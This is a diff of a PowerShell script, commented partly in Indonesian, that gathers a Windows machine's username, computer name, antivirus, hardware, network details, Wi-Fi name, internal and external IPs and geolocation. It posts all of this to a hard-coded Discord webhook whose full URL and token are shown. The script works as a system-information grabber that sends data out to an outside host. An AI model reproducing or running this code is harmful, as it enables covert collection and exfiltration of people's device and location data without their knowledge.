@@ -1,7 +1,5 @@
-# Ambil tanggal dan waktu sekarang
-$date = Get-Date -Format "yyyy-MM-dd HH:mm:ss tt"
 
-# Ambil informasi sistem
+# get system info
 $os = Get-CimInstance -ClassName Win32_OperatingSystem
 $osVersion = "$($os.Caption) ($($os.OSArchitecture))"
 $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty DisplayVersion
@@ -9,7 +7,6 @@ $winversion = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Curren
         $winversion = $null
     }
 
-# Ambil informasi pengguna
 $username = $env:USERNAME
 $compName = $env:COMPUTERNAME
 $language = (Get-Culture).Name
@@ -60,8 +57,8 @@ $resolution = "{0}x{1}" -f [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.W
 # Ambil informasi jaringan
 $gatewayIP = (Get-NetRoute | Where-Object { $_.DestinationPrefix -eq "0.0.0.0/0" } | Select-Object -ExpandProperty NextHop)
 $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" }).IPAddress
+$ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"
 
-# Ambil SSID (Wi-Fi MAC Address)
 $wifi = Get-NetAdapter | Where-Object { $_.InterfaceDescription -match 'Wireless' -and $_.Status -eq 'Up' }
 if ($wifi) {
     $wifiName = (Get-NetConnectionProfile -InterfaceAlias $wifi.Name).Name
@@ -86,8 +83,6 @@ $WifiName = $wifiName
 $LanStatus = $lanStatus
 $InternetStatus = $internetStatus
 
-$ip = Invoke-RestMethod -Uri "http://ip-api.com/json/"
-
 # URL Webhook Discord
 $webhookUrl = "https://discordapp.com/api/webhooks/1337473371004338216/eg9k89643pevgT6pc1nlWWARilOoFv5Fi5SKoE9J9-m_81W8k4me_wD_pAqU1U2e621g"
 
@@ -105,7 +100,7 @@ $payload = @{
         color = 3447003
         fields = @(
             @{ name = ":computer: **System**"; value = "**System:** $osVersion`n**Windows Version:** $winversion`n**Username:** $username`n**CompName:** $compName`n**Language:** $language`n**Antivirus:** $antivirus `n`n"; inline = $false },
-            @{ name = ":desktop: **Hardware**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core) ($($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n $diskall`n"; inline = $false },
+            @{ name = ":desktop: **Hardware**"; value = "**Manufacture:** $Manufacturer`n**Model:** $Type ($Model)`n**CPU:** $($Name) ($($Cores) Core, $($LogicalProcessors) Treads)`n**GPU:** $gpu`n**RAM:** $TotalSizeInGB GB // $Modules`n**Power:** $batteryStatus`n**Screen:** $resolution`n**Disk:**`n $diskall`n"; inline = $false },
             @{ name = ":globe_with_meridians: **Network**"; value = "**SSID:** $WifiName`n**LAN:**n$LanStatus`n**Internet Status:** $InsternetStatus`n**Location:** $($ip.country),  $($ip.city), $($ip.regionName) ($($ip.zip))`n**Gateway IP:** $gatewayIP`n**Internal IP:** $localIP`n**External IP:** $($ip.query)`n"; inline = $false }
         )
         #thumbnail = @{ url = $thumbnailUrl }
